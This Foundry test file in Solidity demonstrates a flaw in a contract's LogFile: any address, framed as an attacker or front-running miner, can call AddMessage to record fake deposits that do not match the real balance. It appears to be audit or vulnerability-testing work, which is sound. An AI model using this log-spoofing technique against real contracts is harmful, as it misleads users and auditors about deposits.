// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/0x4e73b32ed6c35f570686b89848e5f39f20ecc106.sol";

contract PRIVATE_ETH_CELL_AddMessage_Test is Test {
    PRIVATE_ETH_CELL private ethCell;
    LogFile private logFile;

    address user = address(0x1);
    address attacker = address(0x2);

    function setUp() public {
        // Deploy contracts
        logFile = new LogFile();
        ethCell = new PRIVATE_ETH_CELL();

        // Setup log file
        ethCell.SetLogFile(address(logFile));

        // Fund user
        vm.deal(user, 1 ether);
    }

    // Test demonstrating how a miner can spoof log entries
    function test_MinerSpoofsLogEntries() public {
        // User makes a legitimate deposit
        vm.prank(user);
        ethCell.Deposit{value: 0.5 ether}();

        // Attacker (miner) front-runs and adds spoofed log entry
        // using inputs they see in mempool
        vm.prank(attacker);
        logFile.AddMessage(user, 1.5 ether, "Deposit");

        // Verify the log was manipulated by checking contract balances - 
        // even though the log shows 1.5 ether deposit, the actual balance
        // in PRIVATE_ETH_CELL remains only 0.5 ether
        uint256 contractBalance = address(ethCell).balance;
        assertEq(contractBalance, 0.5 ether, "Contract balance mismatch");
        assertFalse(
            contractBalance == 1.5 ether,
            "Miner successfully spoofed deposit in logs"
        );
    }

    // Test showing anyone can manipulate logs
    function test_AnyoneCanManipulateLogs() public {
        // Directly add fake log entry without any state changes
        vm.prank(attacker);
        logFile.AddMessage(attacker, 5 ether, "Fake Deposit");

        // Important: Show that logs can be manipulated independently of actual transactions
        uint256 contractBalance = address(ethCell).balance;
        assertEq(contractBalance, 0, "Actual contract balance remains unchanged");
    }
}
